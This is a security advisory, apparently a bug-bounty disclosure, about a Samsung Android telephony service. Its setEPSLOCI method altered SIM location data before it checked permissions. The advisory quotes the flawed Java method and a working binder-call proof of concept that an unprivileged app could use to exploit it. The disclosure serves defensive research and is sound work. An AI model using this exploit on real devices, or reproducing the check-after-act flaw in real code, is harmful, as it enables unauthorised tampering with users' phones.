# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/telephony-common.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.01</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

The `isemtelephony` system service contained a method `com.samsung.android.telephony.telephonyserviceinterface.SemTelephonyServiceImpl.setEPSLOCI()` that changed the ESP LOCI setting before checking permission:
```java
public void setEPSLOCI(byte[] newEpsloci) {
    logi("> setEPSLOCI");
    getDefaultPhone().getIccCard().setEPSLOCI(newEpsloci); // changing state
    int subId = SubscriptionManager.getDefaultSubscriptionId();
    enforceModifyPermissionOrCarrierPrivilege(subId, null); // checking permission
    Boolean completed = (Boolean) this.mSemTelephonyServiceHandler.sendRequest(66, null);
    logi("< setEPSLOCI " + completed);
}
```

**Proof of Concept**

```java
static final int TRANSACTION_setEPSLOCI = 17;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("isemtelephony");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel.writeByteArray(new byte[1000]);

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_setEPSLOCI, parcel, reply, 0);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
- [Oversecured Blog. Common mistakes when using permissions in Android](https://blog.oversecured.com/Common-mistakes-when-using-permissions-in-Android/)
